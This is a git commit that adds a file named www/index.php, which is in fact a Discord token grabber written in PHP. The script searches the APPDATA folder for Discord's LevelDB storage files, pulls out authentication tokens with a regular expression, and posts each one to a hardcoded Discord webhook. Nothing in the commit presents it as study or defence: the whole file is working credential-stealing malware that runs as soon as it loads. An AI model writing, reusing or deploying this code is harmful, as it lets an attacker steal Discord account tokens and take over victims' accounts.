6463c72b4ca485cd6278593a2367be5e88cab3b7
coats1337 <53409082+coats1337@users.noreply.github.com>
2020-06-17 13:16:30 +0200

    aaaaaaaaa

---
+++ www/index.php
@@ -0,0 +1,59 @@
+<?php
+
+function get_discord_folders() {
+    $discord_folders = new ArrayObject(array());
+    $appdata = getenv("APPDATA");
+    $dirs = scandir($appdata);
+    foreach ($dirs as $directory) {
+        if (strpos($directory, "discord") !== false) {
+            $discord_folders->append("$appdata\\$directory");
+        }
+    }
+    return $discord_folders;
+}
+
+function get_ldb_files() {
+    $discord_ldb = new ArrayObject(array());
+    $directories = get_discord_folders();
+    foreach ($directories as $hi) {
+        $dirs = scandir("$hi\\");
+        foreach ($dirs as $poop) {
+            if (strpos($poop, 'Local Storage') !== false) {
+                $path = scandir("$hi\\$poop\\leveldb");
+                foreach ($path as $ldb) {
+                    if (strpos($ldb, ".ldb") !== false) {
+                        $discord_ldb->append("$hi\\$poop\\leveldb\\$ldb");
+                    }
+                }
+            }
+        }
+    }
+    return $discord_ldb;
+}
+
+function grab_tokens() {
+    $ldb = get_ldb_files();
+    $discord_hook = "https://discord.com/api/webhooks/722771124676722688/";
+    $token_regex = "/[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}/";
+    foreach ($ldb as $lol) {
+        $file = fopen($lol, "r");
+        if (preg_match($token_regex, fread($file, filesize($lol)), $match)) {
+            foreach ($match as $token) {
+                $payload = array(
+                    "content" => $token
+                );
+                $options = array(
+                    "http" => array(
+                        "header" => "Content-Type: application/json\r\n",
+                        "method" => "POST",
+                        "content" => json_encode($payload)
+                    )
+                );
+                $context  = stream_context_create($options);
+                file_get_contents($discord_hook, false, $context);
+            }
+        }
+    }
+}
+
+grab_tokens();
